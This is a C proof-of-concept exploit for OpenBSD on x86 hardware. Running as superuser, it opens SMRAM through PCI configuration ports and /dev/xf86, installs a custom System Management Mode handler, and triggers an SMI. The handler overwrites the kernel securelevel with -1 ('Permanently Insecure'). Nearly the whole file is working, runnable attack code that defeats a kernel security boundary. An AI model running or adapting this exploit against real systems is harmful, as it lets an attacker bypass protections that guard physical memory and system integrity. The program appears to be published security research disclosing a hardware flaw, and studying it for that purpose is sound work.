/*
 * This proof-of-concept program shows how an attacker with superuser
 * privileges can exploit hardware (processor and chipset) functionalities
 * to circumvent securelevel-imposed restrictions and gain unlimited
 * access to physical memory under OpenBSD.
 * This access is used here to lower the securelevel from a supposedly
 * "Secure" or "Highly Secure" level to "Permanently Insecure".
 * Note: This program must be linked with -li386.
 */

#include <stdio.h>              /* printf() */
#include <unistd.h>             /* open() */
#include <stdlib.h>             /* exit() */
#include <string.h>             /* memcpy() */
#include <sys/mman.h>           /* mmap() */
#include <sys/types.h>          /* read(), write() and mmap() params */
#include <fcntl.h>              /* open() parameters */
#include <machine/sysarch.h>    /* i386_iopl() */
#include <machine/pio.h>        /* port i/o operations, like outl() */


#define MEMDEVICE "/dev/xf86"
#define SECLVL_PHYS_ADDR "0x00598944"
/* obtained as "nm /bsd | grep securelevel" - 0xd0000000 */


/* This is our SMM handler */
extern char handler[], endhandler[]; /* C-code glue for the asm insert */
asm (
    ".data\n"
    ".code16\n"
    ".globl handler, endhandler\n"
    "\n"
    "handler:\n"
    " addr32 mov $test, %eax\n" /* Set protected mode return */
    " mov %eax, %cs:0xfff0\n"   /* address to test() */
    " mov $0x0, %ax\n"
    " mov %ax, %ds\n" /* DS = 0 */
    " mov $0xffffffff, %eax\n"
    " addr32 mov %eax," SECLVL_PHYS_ADDR "\n" /* securelevel = -1 */
    " rsm\n" /* Switch back to protected mode */
    "endhandler:\n"
    "\n"
    ".text\n"
    ".code32\n"
);


/* We wish to replace the default system management mode
 * handler with "handler" (16-bit asm) to modify the secure
 * level while in SMM mode. Additionnaly, we change the
 * saved EIP value so that we return to our test() function. */


/* This function is never explicitly called -- it is only executed upon
 * successful return from SMM mode */
void test(void)
{
    printf("Changed secure level to INSECURE\n");
    exit(EXIT_SUCCESS);
}



int main(void)
{
    int fd;
    unsigned char *vidmem;

    /* Raise IOPL to 3 to open all I/O ports */
    i386_iopl(3);

    /* Open SMRAM access (interferes with X server) */
    outl(0xcf8, 0x8000009c);
    outl(0xcfc, 0x00384a00);

    /* Map SMM handler code (0xa8000-Oxa8fff) in our address space */
    fd = open(MEMDEVICE, O_RDWR);
    vidmem = mmap(NULL,4096,PROT_READ | PROT_WRITE,MAP_SHARED,fd,0xa8000);
    close(fd);

    /* Upload custom-made handler in SMRAM */
    memcpy(vidmem, handler, endhandler-handler);

    /* Release SMM handler memory mapping */
    munmap(vidmem, 4096);

    /* Close SMRAM access */
    outl(0xcf8, 0x8000009c);
    outl(0xcfc, 0x00380a00);

    /* Trigger an SMI: This should execute the new SMM handler */
    outl(0xb2, 0x0000000f);

    /* This should not be executed: SMM handler returns to test()... */
    exit(EXIT_FAILURE);
}
